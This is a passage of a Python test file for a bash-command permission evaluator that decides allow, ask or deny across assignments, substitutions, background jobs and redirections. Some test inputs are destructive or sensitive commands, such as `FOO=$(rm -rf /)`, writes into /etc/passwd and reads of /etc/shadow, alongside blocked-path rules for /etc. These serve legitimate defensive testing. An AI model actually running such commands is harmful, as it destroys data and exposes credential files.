        assert result["status"] == "ask"

    def test_empty_segments_wildcard_allow(self) -> None:
        """Unmatched export command with wildcard=allow → allow."""
        result = evaluate_bash_command("export BOGUS=true bogus", make_config(allowed=["^ls"], wildcard="allow"))
        assert result["status"] == "allow"

    def test_empty_segments_wildcard_deny(self) -> None:
        """Unmatched export command with wildcard=deny → deny."""
        result = evaluate_bash_command("export BOGUS=true bogus", make_config(allowed=["^ls"], wildcard="deny"))
        assert result["status"] == "deny"

    def test_export_segment_extracted_no_patterns(self) -> None:
        """Export produces a segment; no patterns → ask."""
        result = evaluate_bash_command("export BOGUS=true bogus", make_config())
        assert result["status"] == "ask"

    def test_export_segment_no_patterns_allows(self) -> None:
        """Export segment matches wildcard allow → allow."""
        result = evaluate_bash_command("export BOGUS=true bogus", make_config(wildcard="allow"))
        assert result["status"] == "allow"

    def test_export_segment_reason_shows_command(self) -> None:
        """Unmatched export reason names the export command."""
        result = evaluate_bash_command("export BOGUS=true bogus", make_config(allowed=["^ls"]))
        assert "export" in result["reason"]

    def test_allow_reason_shows_patterns(self) -> None:
        """Matching command reason contains actual pattern(s)."""
        result = evaluate_bash_command("ls -la", make_config(allowed=["^ls", "^-la$"]))
        assert "pattern" in result["reason"] or "patterns" in result["reason"]

    def test_empty_segment_reason_not_generic(self) -> None:
        """Unmatched segment reason NOT generic 'matches allowed pattern'."""
        result = evaluate_bash_command("export BOGUS=true bogus", make_config(allowed=["^ls"]))
        assert "matches allowed pattern" not in result["reason"]

    def test_bogus_command_rejected(self) -> None:
        """'bogus' with allowed patterns → ask (existing behavior)."""
        result = evaluate_bash_command("bogus", make_config(allowed=["^ls"]))
        assert result["status"] == "ask"

    def test_export_bogus_rejected(self) -> None:
        """'export BOGUS=true bogus' → ask (unmatched segment wildcard policy)."""
        result = evaluate_bash_command("export BOGUS=true bogus", make_config(allowed=["^ls"]))
        assert result["status"] == "ask"

    def test_export_bogus_reason_not_auto_approved(self) -> None:
        """Reason should NOT contain 'auto-approved'."""
        result = evaluate_bash_command("export BOGUS=true bogus", make_config(allowed=["^ls"]))
        reason = result["reason"].lower()
        assert "auto-approved" not in reason, f"Reason should not contain 'auto-approved': {reason}"

    def test_case_clause_extracted(self) -> None:
        """Case statement commands are extracted from branch bodies."""
        result = evaluate_bash_command(
            "case x in a) ls;; b) cp src dst;; esac",
            make_config(allowed=["^ls$", "^cp\\s+src\\s+dst$"]),
        )
        assert result["status"] == "allow"  # both commands match patterns

    def test_testclause_operands_are_not_commands(self) -> None:
        """TestClause ([[ ]]) operands are values, not commands.

        bash never executes a ``[[ ]]`` operand - `[[ -d /tmp && ls ]]` only
        tests whether the string "ls" is non-empty - so nothing is extracted
        and the wildcard decides.
        """
        result = evaluate_bash_command(
            "[[ -d /tmp && ls ]]",
            make_config(allowed=["^ls$"]),
        )
        assert [s["command"] for s in result["segments"]] == []
        assert result["status"] == "ask"

    def test_testclause_substitution_is_extracted(self) -> None:
        """Only substitutions inside [[ ]] actually run, so they are extracted."""
        result = evaluate_bash_command(
            "[[ -d /tmp && $(ls) ]]",
            make_config(allowed=["^ls$"], command_substitution="allow"),
        )
        assert [s["command"] for s in result["segments"]] == ["ls"]
        assert result["status"] == "allow"

    def test_time_clause_extracted(self) -> None:
        """time <cmd> extracts the command from inside."""
        result = evaluate_bash_command(
            "time sleep 1",
            make_config(allowed=["^sleep\\s+1$"]),
        )
        assert result["status"] == "allow"

    def test_coproc_extracted(self) -> None:
        """coprocess extracts command from stmt."""
        result = evaluate_bash_command(
            "coproc mycmd arg",
            {"*": "ask", "allowed_cmds_regex": ["^mycmd\\s+arg$"], "background_execution": "allow"},
        )
        assert result["status"] == "allow"


class TestEvaluateTestClausePolicies:
    """[[ ]] with attached redirections must honor redirection policies."""

    def test_testclause_output_redirection_denied(self) -> None:
        result = evaluate_bash_command(
            "[[ -f file ]] > /tmp/out",
            make_config(wildcard="allow", output="deny"),
        )
        assert result["status"] == "deny"
        assert "output redirection denied" in result["reason"]

    def test_testclause_output_redirection_append_denied(self) -> None:
        result = evaluate_bash_command(
            "[[ -f file ]] >> /tmp/out",
            make_config(wildcard="allow", output="deny"),
        )
        assert result["status"] == "deny"

    def test_testclause_stderr_redirection_denied(self) -> None:
        result = evaluate_bash_command(
            "[[ -f file ]] 2> /tmp/out",
            make_config(wildcard="allow", output="deny"),
        )
        assert result["status"] == "deny"

    def test_testclause_output_redirection_asks(self) -> None:
        result = evaluate_bash_command(
            "[[ -f file ]] > /tmp/out",
            make_config(wildcard="allow", output="ask"),
        )
        assert result["status"] == "ask"
        assert "output redirection requires approval" in result["reason"]

    def test_testclause_input_redirection_denied(self) -> None:
        result = evaluate_bash_command(
            "[[ -f file ]] < /tmp/in",
            make_config(wildcard="allow", input_redir="deny"),
        )
        assert result["status"] == "deny"
        assert "input redirection denied" in result["reason"]

    def test_testclause_redirect_target_blocked(self) -> None:
        result = evaluate_bash_command(
            "[[ -f file ]] > /etc/passwd",
            make_config(blocked=["/etc"]),
        )
        assert result["status"] == "deny"
        assert "blocked pattern" in result["reason"]

    def test_testclause_redir_with_command_body_denied(self) -> None:
        result = evaluate_bash_command(
            "[[ -d /tmp && ls ]] > /tmp/out",
            make_config(wildcard="allow", output="deny"),
        )
        assert result["status"] == "deny"
        assert "output redirection denied" in result["reason"]

    def test_regex_rhs_no_false_phantom_command(self) -> None:
        """=~ regex RHS must not be reported as an unmatched command."""
        result = evaluate_bash_command(
            "[[ $var =~ pat ]] > /tmp/out",
            make_config(allowed=["^ls$"], wildcard="allow", output="deny"),
        )
        assert result["status"] == "deny"
        assert '"pat" command does not match' not in result["reason"]

    def test_regex_rhs_redirection_still_denied(self) -> None:
        result = evaluate_bash_command(
            "[[ $var =~ pat ]] > /tmp/out",
            make_config(wildcard="allow", output="deny"),
        )
        assert result["status"] == "deny"
        assert "output redirection denied" in result["reason"]


class TestEvaluateVariableAssignment:
    """Tests for variable_assignment policy (standalone vs command-prefixed assignments)."""

    def test_standalone_variable_assignment_requires_approval(self) -> None:
        """Standalone variable assignment (FOO=bar) requires approval by default."""
        result = evaluate_bash_command("FOO=bar", make_config())
        assert result["status"] == "ask"
        assert "variable assignment" in result["reason"]

    def test_variable_assignment_before_command_requires_approval(self) -> None:
        """Variable assignment before command (FOO=bar ls) requires approval by default."""
        result = evaluate_bash_command("FOO=bar ls", make_config())
        assert result["status"] == "ask"
        assert "variable assignment" in result["reason"]

    def test_variable_assignment_before_command_and_command_both_need_approval(self) -> None:
        """FOO=bar ls with only ls allowed still asks due to variable_assignment."""
        result = evaluate_bash_command(
            "FOO=bar ls",
            make_config(allowed=["^ls$"]),
        )
        # variable_assignment is default "ask", so this should ask
        assert result["status"] == "ask"

    def test_variable_assignment_allow_policy(self) -> None:
        """variable_assignment=allow auto-approves standalone assignments."""
        result = evaluate_bash_command(
            "FOO=bar",
            make_config(variable_assignment="allow"),
        )
        assert result["status"] == "allow"

    def test_variable_assignment_deny_policy(self) -> None:
        """variable_assignment=deny auto-denies standalone assignments."""
        result = evaluate_bash_command(
            "FOO=bar",
            make_config(variable_assignment="deny"),
        )
        assert result["status"] == "deny"

    def test_variable_assignment_before_command_with_allow(self) -> None:
        """variable_assignment=allow auto-approves FOO=bar ls (both segments)."""
        result = evaluate_bash_command(
            "FOO=bar ls",
            make_config(allowed=["^ls$"], variable_assignment="allow"),
        )
        assert result["status"] == "allow"

    def test_variable_assignment_before_command_with_deny(self) -> None:
        """variable_assignment=deny denies FOO=bar ls even if ls is allowed."""
        result = evaluate_bash_command(
            "FOO=bar ls",
            make_config(allowed=["^ls$"], variable_assignment="deny"),
        )
        assert result["status"] == "deny"

    def test_variable_assignment_and_command_separate_segments(self) -> None:
        """FOO=bar ls produces two segments: variable assignment + command."""
        result = evaluate_bash_command(
            "FOO=bar ls",
            make_config(allowed=["^ls$"], variable_assignment="ask"),
        )
        # Should be ask due to variable_assignment, not due to ls being unknown
        assert result["status"] == "ask"

    def test_variable_assignment_in_separate_statement(self) -> None:
        """FOO=bar ; ls produces two separate statements."""
        result = evaluate_bash_command(
            "FOO=bar ; ls",
            make_config(allowed=["^ls$"], variable_assignment="allow"),
        )
        assert result["status"] == "allow"

    def test_export_still_treated_as_command(self) -> None:
        """`export FOO=bar` runs `export`, and its operand is a variable assignment.

        Both halves matter: the keyword is a command segment the allowed pattern
        matches on its own, while the operand is a *separate* segment that
        ``variable_assignment`` gates.  So allowing the assignment lets the
        pattern speak for the keyword, and denying it denies the whole command
        even though `export` itself is allow-listed.
        """
        allowed = [r"^export(\s+.*)?$"]
        allowed_result = evaluate_bash_command(
            "export FOO=bar",
            make_config(allowed=allowed, wildcard="allow", variable_assignment="allow"),
        )
        assert allowed_result["status"] == "allow"
        assert [(s["command"], s["arguments"]) for s in allowed_result["segments"]] == [
            ("", ["FOO=bar"]),
            ("export", []),
        ]
        assert r"command matches allowed pattern: ^export(\s+.*)?$" in allowed_result["reason"]

        denied_result = evaluate_bash_command(
            "export FOO=bar",
            make_config(allowed=allowed, wildcard="allow", variable_assignment="deny"),
        )
        assert denied_result["status"] == "deny"
        assert "variable assignment denied: ['FOO=bar']" in denied_result["reason"]

    def test_local_still_treated_as_command(self) -> None:
        """`local FOO=bar` runs `local`, and its operand is a variable assignment.

        Same split as `export`: the keyword segment is matchable by
        ``allowed_cmds_regex``, and the operand is gated by
        ``variable_assignment`` on its own.
        """
        allowed = [r"^local(\s+.*)?$"]
        allowed_result = evaluate_bash_command(
            "local FOO=bar",
            make_config(allowed=allowed, wildcard="allow", variable_assignment="allow"),
        )
        assert allowed_result["status"] == "allow"
        assert [(s["command"], s["arguments"]) for s in allowed_result["segments"]] == [
            ("", ["FOO=bar"]),
            ("local", []),
        ]
        assert r"command matches allowed pattern: ^local(\s+.*)?$" in allowed_result["reason"]

        denied_result = evaluate_bash_command(
            "local FOO=bar",
            make_config(allowed=allowed, wildcard="allow", variable_assignment="deny"),
        )
        assert denied_result["status"] == "deny"
        assert "variable assignment denied: ['FOO=bar']" in denied_result["reason"]

    def test_multiple_variable_assignments_before_command(self) -> None:
        """Multiple variable assignments before command all get checked."""
        result = evaluate_bash_command(
            "FOO=bar BAZ=qux ls",
            make_config(allowed=["^ls$"], variable_assignment="allow"),
        )
        assert result["status"] == "allow"

    def test_variable_assignment_with_command_substitution_deny(self) -> None:
        """x=$(cmd) is a variable assignment - variable_assignment=deny should deny it."""
        result = evaluate_bash_command(
            "x=$(cat file.txt)",
            make_config(allowed=["^cat$"], command_substitution="allow", variable_assignment="deny"),
        )
        assert result["status"] == "deny"

    def test_variable_assignment_with_command_substitution_allow(self) -> None:
        """x=$(cmd) with variable_assignment=allow and command_substitution=allow auto-approves."""
        result = evaluate_bash_command(
            "x=$(cat file.txt)",
            make_config(allowed=[r"^cat(\s+.*)?$"], command_substitution="allow", variable_assignment="allow"),
        )
        assert result["status"] == "allow"

    def test_assignment_subshell_redir_blocked_path_denied(self) -> None:
        """A blocked-path write inside a `x=$(...)` substitution is denied.

        The standalone-assignment branch must flatten the inner command, so
        `x=$(echo hi > /etc/passwd)` exposes its redirection target to the
        blocked-path check.
        """
        result = evaluate_bash_command(
            "x=$(echo hi > /etc/passwd)",
            make_config(blocked=[r"^/etc/passwd$"], command_substitution="allow", variable_assignment="allow"),
        )
        assert result["status"] == "deny"
        assert "matches blocked pattern" in result["reason"]

    def test_assignment_subshell_output_redir_policy_applies(self) -> None:
        """The output-redirection policy applies inside `x=$(...)` substitutions.

        The inner segment (with its redirection) must be surfaced, so
        `x=$(echo hi > /tmp/out)` asks under output_redirection=ask.
        """
        result = evaluate_bash_command(
            "x=$(echo hi > /tmp/out)",
            make_config(
                allowed=[r"^echo(\s+.*)?$"], output="ask", command_substitution="allow", variable_assignment="allow"
            ),
        )
        assert result["status"] == "ask"
        assert "output redirection requires approval" in result["reason"]

    def test_assignment_subshell_input_redir_blocked_path_denied(self) -> None:
        """A blocked-path read inside `x=$(...)` substitutions is denied."""
        result = evaluate_bash_command(
            "x=$(cat </etc/passwd)",
            make_config(blocked=[r"^/etc/passwd$"], command_substitution="allow", variable_assignment="allow"),
        )
        assert result["status"] == "deny"

    def test_assignment_subshell_no_redir_still_allowed(self) -> None:
        """Plain `x=$(cmd)` assignments stay allowed with allow policies."""
        result = evaluate_bash_command(
            "x=$(echo hi)",
            make_config(allowed=[r"^echo(\s+.*)?$"], command_substitution="allow", variable_assignment="allow"),
        )
        assert result["status"] == "allow"


class TestEvaluateDeclarationOperandsAreVariableAssignments:
    """A declaration builtin's operands reach the variable_assignment policy.

    The operands are split into their own variable-assignment segment rather
    than hanging off the variant segment (``[('export', ['FOO=bar'])]``),
    because the policy is only ever consulted for
    a segment whose command is `""`.  With
    ``{"*": "allow", "variable_assignment": "deny"}`` the bare ``FOO=bar``
    denies, and every declared form must deny with it - otherwise the policy
    would be bypassed by typing one extra word in front of the assignment.
    """

    _CONFIG: ClassVar[dict[str, str]] = {"*": "allow", "variable_assignment": "deny"}

    @pytest.mark.parametrize(
        ("source", "keyword"),
        [
            ("FOO=bar", None),
            ("export FOO=bar", "export"),
            ("readonly FOO=bar", "readonly"),
            ("local x=1", "local"),
            ("declare -i y=2", "declare"),
            ("typeset -x z=3", "typeset"),
            ("export A=(a b)", "export"),
            # A naked name counts too: shfmt reports `export FOO` as a
            # name-less assign, so it is an assignment - unlike a bare `FOO`,
            # which is a call and stays with the wildcard.
            ("export FOO", "export"),
        ],
    )
    def test_denied_like_the_bare_assignment(self, source: str, keyword: str | None) -> None:
        result = evaluate_bash_command(source, self._CONFIG)
        assert result["status"] == "deny", source
        assert "variable assignment denied" in result["reason"], source
        # The denial comes from a real variable-assignment segment, not from the
        # keyword segment; the keyword is still reported, behind the operand.
        assert [segment["command"] for segment in result["segments"]] == ([""] if keyword is None else ["", keyword])

    def test_declared_form_denies_exactly_when_the_bare_form_does(self) -> None:
        for bare, declared in (
            ("FOO=bar", "export FOO=bar"),
            ("A=(a b)", "export A=(a b)"),
            ("A+=(a b)", "export A+=(a b)"),
        ):
            assert evaluate_bash_command(bare, self._CONFIG)["status"] == "deny", bare
            assert evaluate_bash_command(declared, self._CONFIG)["status"] == "deny", declared

    def test_variant_keyword_is_still_an_allow_matchable_command(self) -> None:
        """Splitting out the operand did not demote the keyword.

        ``export`` is still its own command segment, still matched by
        ``allowed_cmds_regex`` on its own line, so allow-listing it works
        exactly as before - the operand's policy is a separate question.
        """
        result = evaluate_bash_command(
            "export FOO=bar",
            {"*": "allow", "allowed_cmds_regex": [r"^export$"], "variable_assignment": "allow"},
        )
        assert result["status"] == "allow"
        assert [(s["command"], s["arguments"]) for s in result["segments"]] == [("", ["FOO=bar"]), ("export", [])]
        assert "command matches allowed pattern: ^export$" in result["reason"]

    def test_denied_operand_still_reports_the_keyword_segment(self) -> None:
        # Both segments are reported, so the caller can see that `local` ran
        # even though the assignment is what caused the denial.
        result = evaluate_bash_command("local x=1", self._CONFIG)
        assert [(s["command"], s["arguments"]) for s in result["segments"]] == [("", ["x=1"]), ("local", [])]


class TestEvaluateCaptureOutputIsAlsoAVariableAssignment:
    """`x=$(cmd)` is an assignment *and* a substitution - both policies apply.

    Every assignment
    yields a variable-assignment segment - including the ones whose value
    captures command output, and including each spelling of that shape. The
    substitution policies are
    applied on top of it by the evaluator, so both gates fire, and
    `FOO=$(rm -rf /) ls` cannot get a different verdict from
    `FOO=$(rm -rf /)`.
    """

    _CONFIG: ClassVar[dict[str, str]] = {
        "*": "allow",
        "variable_assignment": "deny",
        "command_substitution": "allow",
    }

    @pytest.mark.parametrize(
        "source",
        ["FOO=$(cmd) ls", "FOO=$(cmd)", "export FOO=$(cmd)", "export $(cmd)"],
    )
    def test_capture_output_still_emits_a_variable_assignment(self, source: str) -> None:
        result = evaluate_bash_command(source, self._CONFIG)
        assert "" in [segment["command"] for segment in result["segments"]], source
        assert result["status"] == "deny", source
        assert "variable assignment denied" in result["reason"], source

    def test_every_spelling_of_the_same_operation_agrees(self) -> None:
        # The `ls` variant must not slip through while the bare one denies.
        for source in ("FOO=$(rm -rf /) ls", "FOO=$(rm -rf /)", "export FOO=$(rm -rf /)"):
            assert evaluate_bash_command(source, self._CONFIG)["status"] == "deny", source

    def test_substitution_policy_still_applies_on_top(self) -> None:
        # With the assignment gate satisfied, command_substitution is the one
        # that denies - proving both gates are live rather than one masking
        # the other.
        permissive = {**self._CONFIG, "variable_assignment": "allow"}
        assert evaluate_bash_command("export FOO=$(rm -rf /)", permissive)["status"] == "allow"
        denied = evaluate_bash_command("export FOO=$(rm -rf /)", {**permissive, "command_substitution": "deny"})
        assert denied["status"] == "deny"
        assert "command substitution" in denied["reason"]

    def test_array_element_substitution_keeps_the_variable_assignment(self) -> None:
        # `A=($(cmd))` puts the substitution in an array *element*, and is
        # reported identically to the value form.
        result = evaluate_bash_command("export A=($(cmd))", self._CONFIG)
        assert [(s["command"], s["arguments"]) for s in result["segments"]] == [
            ("", ["A=($(...))"]),
            ("export", []),
            ("cmd", []),
        ]
        assert result["status"] == "deny"
        assert "variable assignment denied: ['A=($(...))']" in result["reason"]


class TestEvaluateBackgroundExecutionCompound:
    """background_execution policy covers coproc and compound & forms.

    Configs are built inline because make_config() only emits
    background_execution when it differs from the "allow" default.
    """

    def test_coproc_denied(self) -> None:
        result = evaluate_bash_command(
            "coproc myproc { echo hi; }",
            {"*": "allow", "allowed_cmds_regex": ["^echo"], "background_execution": "deny"},
        )
        assert result["status"] == "deny"
        assert "background execution denied" in result["reason"]

    def test_coproc_ask(self) -> None:
        result = evaluate_bash_command(
            "coproc myproc { echo hi; }",
            {"*": "allow", "allowed_cmds_regex": ["^echo"], "background_execution": "ask"},
        )
        assert result["status"] == "ask"

    def test_coproc_allowed(self) -> None:
        result = evaluate_bash_command(
            "coproc myproc { echo hi; }",
            {"*": "allow", "allowed_cmds_regex": ["^echo"], "background_execution": "allow"},
        )
        assert result["status"] == "allow"

    def test_compound_block_denied(self) -> None:
        result = evaluate_bash_command(
            "{ echo hi; } &",
            {"*": "allow", "allowed_cmds_regex": ["^echo"], "background_execution": "deny"},
        )
        assert result["status"] == "deny"

    def test_compound_if_denied(self) -> None:
        result = evaluate_bash_command(
            "if true; then echo hi; fi &",
            {"*": "allow", "allowed_cmds_regex": ["^echo"], "background_execution": "deny"},
        )
        assert result["status"] == "deny"

    def test_subshell_inner_background_denied(self) -> None:
        """`(echo hi &)` backgrounds the inner command - policy applies."""
        result = evaluate_bash_command(
            "(echo hi &)",
            {"*": "allow", "allowed_cmds_regex": ["^echo"], "background_execution": "deny"},
        )
        assert result["status"] == "deny"

    def test_subshell_inner_background_ask(self) -> None:
        result = evaluate_bash_command(
            "(echo hi &)",
            {"*": "allow", "allowed_cmds_regex": ["^echo"], "background_execution": "ask"},
        )
        assert result["status"] == "ask"

    def test_assignment_substitution_background_denied(self) -> None:
        """`x=$(echo hi &)` backgrounds a command inside a substitution."""
        result = evaluate_bash_command(
            "x=$(echo hi &)",
            {
                "*": "allow",
                "allowed_cmds_regex": ["^echo"],
                "background_execution": "deny",
                "variable_assignment": "allow",
                "command_substitution": "allow",
            },
        )
        assert result["status"] == "deny"


class TestEvaluateCompoundCommandRedirections:
    """Redirections on time/funcdef/coproc statements are not dropped: the inner
    Stmt's redirections survive, so `time echo hi > /etc/passwd` is gated.
    """

    def test_compound_input_redirection_not_duplicated(self) -> None:
        """< file on a while loop is attributed once, not per segment."""
        result = evaluate_bash_command(
            "while :; do echo a; done < /etc/shadow",
            {"*": "allow", "input_redirection": "allow"},
        )
        assert result["status"] == "allow"
        assert result["reason"].count("/etc/shadow") == 1

    def test_time_blocked_path_denied(self) -> None:
        result = evaluate_bash_command(
            "time echo hi > /etc/passwd",
            make_config(blocked=[r"^/etc/passwd$"], command_substitution="allow", variable_assignment="allow"),
        )
        assert result["status"] == "deny"

    def test_time_output_redirection_asks(self) -> None:
        result = evaluate_bash_command(
            "time echo hi > /tmp/out",
            make_config(
                allowed=[r"^echo(\s+.*)?$"], output="ask", command_substitution="allow", variable_assignment="allow"
            ),
        )
        assert result["status"] == "ask"

    def test_time_no_redirection_unaffected(self) -> None:
        result = evaluate_bash_command(
            "time echo hi",
            make_config(allowed=[r"^echo(\s+.*)?$"], command_substitution="allow", variable_assignment="allow"),
        )
        assert result["status"] == "allow"

    def test_funcdef_blocked_path_denied(self) -> None:
        result = evaluate_bash_command(
            "f() { echo hi; } > /etc/passwd",
            make_config(blocked=[r"^/etc/passwd$"], command_substitution="allow", variable_assignment="allow"),
        )
        assert result["status"] == "deny"

    def test_coproc_blocked_path_denied(self) -> None:
        result = evaluate_bash_command(
            "coproc c { echo hi; } > /etc/passwd",
            make_config(blocked=[r"^/etc/passwd$"], command_substitution="allow", variable_assignment="allow"),
        )
        assert result["status"] == "deny"


class TestEvaluateTrickyRedirectionPatterns:
    """Tests for uncommon or ambiguous bash syntax with redirections.

    These patterns often trip up parsers with no spaces, mixed direction
    redirections, fd manipulation, and background job combinations.
    """

    def test_no_space_redirect_empty(self) -> None:
        """true>file (no space) should require approval in empty config."""
        result = evaluate_bash_command("true>file", make_config())
        assert result["status"] == "ask"

    def test_no_space_redirect_env2(self) -> None:
        """true>file (no space) should require approval in env2 (redirection requires approval)."""
        result = evaluate_bash_command("true>file", make_config())
        assert result["status"] == "ask"

    def test_partial_space_redirect_env2(self) -> None:
        """true> file (partial space) should require approval in env2."""
        result = evaluate_bash_command("true> file", make_config())
        assert result["status"] == "ask"

    def test_no_space_after_redirect_env2(self) -> None:
        """true >file (no space after) should require approval in env2."""
        result = evaluate_bash_command("true >file", make_config())
        assert result["status"] == "ask"

    def test_chained_redirect_empty(self) -> None:
        """true > file > file2 should require approval in empty config."""
        result = evaluate_bash_command("true > file > file2", make_config())
        assert result["status"] == "ask"

    def test_chained_redirect_env2(self) -> None:
        """true > file > file2 should require approval in env2."""
        result = evaluate_bash_command("true > file > file2", make_config())
        assert result["status"] == "ask"

    def test_mixed_direction_redirect_empty(self) -> None:
        """true > file < file2 should require approval in empty config."""
        result = evaluate_bash_command("true > file < file2", make_config())
        assert result["status"] == "ask"

    def test_mixed_direction_redirect_env2(self) -> None:
        """true > file < file2 should require approval in env2."""
        result = evaluate_bash_command("true > file < file2", make_config())
        assert result["status"] == "ask"

    def test_stderr_to_stdout_empty(self) -> None:
        """true > file 2>&1 should require approval in empty config."""
        result = evaluate_bash_command("true > file 2>&1", make_config())
        assert result["status"] == "ask"

    def test_stderr_to_stdout_env2(self) -> None:
        """true > file 2>&1 should require approval in env2."""
        result = evaluate_bash_command("true > file 2>&1", make_config())
        assert result["status"] == "ask"

    def test_background_empty(self) -> None:
        """true > file & should require approval in empty config."""
        result = evaluate_bash_command("true > file &", make_config())
        assert result["status"] == "ask"

    def test_background_env2(self) -> None:
        """true > file & should require approval in env2."""
        result = evaluate_bash_command("true > file &", make_config())
        assert result["status"] == "ask"

    def test_devnull_empty(self) -> None:
        """cmd > /dev/null should require approval in empty config."""
        result = evaluate_bash_command("cmd > /dev/null", make_config())
        assert result["status"] == "ask"

    def test_devnull_env2(self) -> None:
        """cmd > /dev/null should require approval in env2 (cmd not allowed)."""
        result = evaluate_bash_command("cmd > /dev/null", make_config())
        assert result["status"] == "ask"

    def test_devnull_env3(self) -> None:
        """cmd > /dev/null should require approval in env3 (cmd not allowed)."""
        result = evaluate_bash_command("cmd > /dev/null", make_config())
        assert result["status"] == "ask"

    def test_devnull_input_empty(self) -> None:
        """cmd < /dev/null should require approval in empty config."""
        result = evaluate_bash_command("cmd < /dev/null", make_config())
        assert result["status"] == "ask"

    def test_devnull_chain_empty(self) -> None:
        """true > /dev/null 2>&1 > /dev/null should require approval in empty config."""
        result = evaluate_bash_command("true > /dev/null 2>&1 > /dev/null", make_config())
        assert result["status"] == "ask"

    def test_devnull_chain_env2(self) -> None:
        """true > /dev/null 2>&1 > /dev/null should require approval in env2."""
        result = evaluate_bash_command("true > /dev/null 2>&1 > /dev/null", make_config())
        assert result["status"] == "ask"

    def test_save_fd_empty(self) -> None:
        """true 3>&1 > /dev/null should require approval in empty config."""
        result = evaluate_bash_command("true 3>&1 > /dev/null", make_config())
        assert result["status"] == "ask"

    def test_save_fd_env2(self) -> None:
        """true 3>&1 > /dev/null should require approval in env2."""
        result = evaluate_bash_command("true 3>&1 > /dev/null", make_config())
        assert result["status"] == "ask"

    def test_save_fd_after_empty(self) -> None:
        """true > /dev/null 3>&1 should require approval in empty config."""
        result = evaluate_bash_command("true > /dev/null 3>&1", make_config())
        assert result["status"] == "ask"

    def test_save_fd_after_env2(self) -> None:
        """true > /dev/null 3>&1 should require approval in env2."""
        result = evaluate_bash_command("true > /dev/null 3>&1", make_config())
        assert result["status"] == "ask"

    def test_redirect_order_empty(self) -> None:
        """true > file </dev/null should require approval in empty config."""
        result = evaluate_bash_command("true > file </dev/null", make_config())
        assert result["status"] == "ask"

    def test_redirect_order_env2(self) -> None:
        """true > file </dev/null should require approval in env2."""
        result = evaluate_bash_command("true > file </dev/null", make_config())
        assert result["status"] == "ask"

    def test_other_redirect_order_empty(self) -> None:
        """true </dev/null > file should require approval in empty config."""
        result = evaluate_bash_command("true </dev/null > file", make_config())
        assert result["status"] == "ask"

    def test_other_redirect_order_env2(self) -> None:
        """true </dev/null > file should require approval in env2."""
        result = evaluate_bash_command("true </dev/null > file", make_config())
        assert result["status"] == "ask"

    def test_complex_bg_empty(self) -> None:
        """true > file1 2>&1 & true > file2 should require approval in empty config."""
        result = evaluate_bash_command("true > file1 2>&1 & true > file2", make_config())
        assert result["status"] == "ask"

    def test_complex_bg_env2(self) -> None:
        """true > file1 2>&1 & true > file2 should require approval in env2."""
        result = evaluate_bash_command("true > file1 2>&1 & true > file2", make_config())
        assert result["status"] == "ask"


class TestEvaluateNestedCompoundExpressions:
    """Tests for deeply nested and compound bash expressions with redirections.

    Verifies the tool correctly handles complex nested structures.
    """

    def test_nested_command_substitution_empty(self) -> None:
        """Nested command substitution with output redirection should ask in empty config."""
        result = evaluate_bash_command("echo $(echo $(echo $(echo hi))) > file", make_config())
        assert result["status"] == "ask"

    def test_nested_command_substitution_env2(self) -> None:
        """Nested command substitution with output redirection should ask in env2."""
        result = evaluate_bash_command("echo $(echo $(echo $(echo hi))) > file", make_config())
        assert result["status"] == "ask"

    def test_nested_command_substitution_env3(self) -> None:
        """Nested command substitution with output redirection should ask in env3."""
        result = evaluate_bash_command("echo $(echo $(echo $(echo hi))) > file", make_config())
        assert result["status"] == "ask"

    def test_pipe_chain_empty(self) -> None:
        """Pipe chain with output redirection should ask in empty config."""
        result = evaluate_bash_command("echo hi | grep hi | grep h | cat > file", make_config())
        assert result["status"] == "ask"

    def test_pipe_chain_env2(self) -> None:
        """Pipe chain with output redirection should ask in env2."""
        result = evaluate_bash_command("echo hi | grep hi | grep h | cat > file", make_config())
        assert result["status"] == "ask"

    def test_pipe_chain_env3(self) -> None:
        """Pipe chain with output redirection should ask in env3."""
        result = evaluate_bash_command("echo hi | grep hi | grep h | cat > file", make_config())
        assert result["status"] == "ask"

    def test_complex_pipeline_empty(self) -> None:
        """Complex pipeline with output redirection should ask in empty config."""
        result = evaluate_bash_command("ls | grep text | xargs cat > file", make_config())
        assert result["status"] == "ask"

    def test_complex_pipeline_env2(self) -> None:
        """Complex pipeline with output redirection should ask in env2."""
        result = evaluate_bash_command("ls | grep text | xargs cat > file", make_config())
        assert result["status"] == "ask"

    def test_complex_pipeline_env3(self) -> None:
        """Complex pipeline with output redirection should ask in env3."""
        result = evaluate_bash_command("ls | grep text | xargs cat > file", make_config())
        assert result["status"] == "ask"

    def test_nested_conditionals_empty(self) -> None:
        """Nested conditionals with output redirection should ask in empty config."""
        result = evaluate_bash_command("if [ x ]; then if [ y ]; then echo hi > file; fi; fi", make_config())
        assert result["status"] == "ask"

    def test_nested_conditionals_env2(self) -> None:
        """Nested conditionals with output redirection should ask in env2."""
        result = evaluate_bash_command("if [ x ]; then if [ y ]; then echo hi > file; fi; fi", make_config())
        assert result["status"] == "ask"

    def test_nested_conditionals_env3(self) -> None:
        """Nested conditionals with output redirection should ask in env3."""
        result = evaluate_bash_command("if [ x ]; then if [ y ]; then echo hi > file; fi; fi", make_config())
        assert result["status"] == "ask"

    def test_compound_logical_empty(self) -> None:
        """Compound logical expressions with output redirection should ask in empty config."""
        result = evaluate_bash_command("[ x ] && ([ y ] || [ z ]) > file", make_config())
        assert result["status"] == "ask"

    def test_compound_logical_env2(self) -> None:
        """Compound logical expressions with output redirection should ask in env2."""
        result = evaluate_bash_command("[ x ] && ([ y ] || [ z ]) > file", make_config())
        assert result["status"] == "ask"

    def test_compound_logical_env3(self) -> None:
        """Compound logical expressions with output redirection should ask in env3."""
        result = evaluate_bash_command("[ x ] && ([ y ] || [ z ]) > file", make_config())
        assert result["status"] == "ask"

    def test_brace_expansion_empty(self) -> None:
        """Brace expansion with output redirection should ask in empty config."""
        result = evaluate_bash_command("echo {a,b,c} > file", make_config())
        assert result["status"] == "ask"

    def test_brace_expansion_env2(self) -> None:
        """Brace expansion with output redirection should ask in env2."""
        result = evaluate_bash_command("echo {a,b,c} > file", make_config())
        assert result["status"] == "ask"

    def test_brace_expansion_env3(self) -> None:
        """Brace expansion with output redirection should ask in env3."""
        result = evaluate_bash_command("echo {a,b,c} > file", make_config())
        assert result["status"] == "ask"

    def test_nested_brace_expansion_env2(self) -> None:
        """Nested brace expansion with output redirection should ask in env2."""
        result = evaluate_bash_command("echo {a,b}{c,d} > file", make_config())
        assert result["status"] == "ask"

    def test_heredoc_with_substitution_empty(self) -> None:
        """Here-document with substitution and output redirection should ask in empty config."""
        result = evaluate_bash_command("cat <<< $(echo hi) > file", make_config())
        assert result["status"] == "ask"

